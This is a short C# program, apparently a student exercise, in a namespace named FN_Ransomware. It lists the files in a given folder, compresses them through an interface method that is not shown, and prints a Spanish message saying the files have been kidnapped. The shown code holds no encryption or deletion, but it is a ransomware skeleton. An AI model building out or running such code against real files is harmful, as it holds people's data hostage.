using FN_Ransomware.Interface;
using System.IO.Compression; // Replace Ionic.Zip with System.IO.Compression
using System;
using System.ComponentModel;
using System.IO;

namespace FN_Ransomware
{
    class Program
    {
        static void Main(string[] args)
        {
            IMetodosFiles manageFiles = new MetodosFiles();   // Se contruye un objeto de tipo interfaz para implementar los metodos declarados en la (interfaz listadoArchivos y GenerarArchivo) 

            //Defino las variables
            int n = 0;  // Contador de cicki
            
            string ruta = args[0];  // Obtine la ruta
            Console.WriteLine(ruta);

            //Obtengo lo archivos pdf
            //Se invocan los metodos.
            //string[] files = Directory.GetFiles(ruta); // Sin implementar los metodos de la clase
            string[] files = manageFiles.listadoArchivos(ruta); // en la variable string tipo arreglo se pasa lso nombre de los archivos llamando al metodo declararado en la interfaces y que la logica del getfiles esta implementada en la clase MetodosFiles
            bool respuesta = manageFiles.GenerarArchivo(files); // en la interfaz se declar el metodo tipo boleano es decir que su implementacion que esta en la clase MEtodosFiles se usa el using para comprimir en una archivo los archivos. Este metod retorna un true en caso de que el archivo se haya generado.

            if (respuesta == true)
            {
                Console.WriteLine("Sus archivos han sido secuentrados");
            }
        }
    }
}
